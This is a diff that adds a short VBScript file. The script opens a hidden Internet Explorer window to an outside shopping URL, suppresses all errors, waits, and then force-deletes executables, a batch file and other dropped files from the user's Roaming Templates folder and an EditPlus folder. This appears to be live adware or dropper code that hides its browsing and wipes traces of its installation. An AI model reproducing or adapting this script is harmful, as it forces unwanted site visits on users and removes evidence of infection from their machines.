@@ -1,0 +1,16 @@
+option explicit
+dim objIe,objFSO
+on error resume next 
+set objIe=createobject("InternetExplorer.Application")
+objIe.navigate "http://buy.3525.com/?0XI"
+objIe.visible=False
+Wscript.Sleep 5000
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+objFSO.DeleteFile("C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Templates\ba*.exe"), True
+Wscript.Sleep 50000
+objIe.visible=True
+objFSO.DeleteFile("C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Templates\a.bat"), True
+objFSO.DeleteFile("C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Templates\ba*.exe"), True
+objFSO.DeleteFile("C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Templates\060101\*.msj"), True
+objFSO.DeleteFile("C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Templates\kk01.icw"), True
+objFSO.DeleteFile("C:\Program Files (x86)\EditPlus\kk01.icw"), True
